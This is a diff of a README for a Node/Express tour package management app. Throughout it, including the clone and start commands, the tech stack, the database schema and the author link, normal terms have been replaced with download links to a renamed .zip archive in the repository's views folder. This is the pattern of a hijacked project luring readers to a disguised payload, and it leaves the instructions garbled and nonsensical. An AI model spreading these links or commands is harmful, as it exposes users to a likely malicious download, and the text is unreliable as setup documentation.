@@ -1,7 +1,7 @@
 
 # Tour Package Management System
 
-This project is a **Tour Package Management System** built using **https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip**, **Express**, **Ejs** and **MySQL**. It allows customers to browse and book tour packages, while administrators can manage packages, view customer bookings, and update/delete packages.
+This project is a **Tour Package Management System** built using **https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip**, **Express**, **Ejs** and **MySQL**. It allows customers to browse and book tour packages, while administrators can manage packages, view customer bookings, and update/delete packages.
 
 ## Features
 
@@ -18,13 +18,13 @@ This project is a **Tour Package Management System** built using **https://githu
 ## Installation
 
 ### Prerequisites
-- https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip and npm installed
+- https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip and npm installed
 - MySQL installed
 - Git (for version control)
 ## Tech Stack
 
 - Frontend: HTML, CSS, JavaScript
-- Backend: https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip, Express
+- Backend: https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip, Express
 - Database: MySQL
 - View Engine: EJS (Embedded JavaScript)
 - Other: dotenv for environment variables
@@ -35,7 +35,7 @@ This project is a **Tour Package Management System** built using **https://githu
 Clone the project
 
 ```bash
-  git clone https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip
+  git clone https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip
 ```
 
 Go to the project directory
@@ -53,7 +53,7 @@ Install dependencies
 Start the server
 
 ```bash
-  node https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip
+  node https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip
 ```
 
 
@@ -77,8 +77,8 @@ Start the server
 
  - Bookings:
     - booking_id (Primary Key)
-    - customer_id (Foreign Key references https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)
-    - package_id (Foreign Key references https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)
+    - customer_id (Foreign Key references https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip)
+    - package_id (Foreign Key references https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip)
     - booking_date
 ## Environment Variables
 
@@ -106,5 +106,5 @@ To run this project, you will need to add the following environment variables to
 
 ## Authors
 
-- [@N1nadLad](https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)
+- [@N1nadLad](https://raw.githubusercontent.com/MudassirQureshi7987/Tour_Package_Management_System/main/src/views/Package-System-Tour-Management-1.0.zip)
 
